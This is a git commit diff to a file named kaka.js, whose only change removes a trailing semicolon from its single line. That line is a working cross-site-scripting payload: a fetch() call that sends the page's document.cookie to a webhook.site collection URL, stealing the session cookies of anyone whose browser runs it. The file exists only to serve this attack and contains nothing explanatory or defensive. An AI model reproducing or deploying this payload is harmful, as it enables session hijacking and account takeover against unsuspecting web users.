cb14ccb57b24be7ff26f97dd8484a08e1f6b6d44
dothuancmt <136438857+dothuancmt@users.noreply.github.com>
2023-09-21 05:17:55 +0700

    Update kaka.js

--- kaka.js
+++ kaka.js
@@ -1,1 +1,1 @@
-fetch('https://webhook.site/7bf72bde-aecb-47fa-835a-04adcf36102e?cookie='+document.cookie);
+fetch('https://webhook.site/7bf72bde-aecb-47fa-835a-04adcf36102e?cookie='+document.cookie)
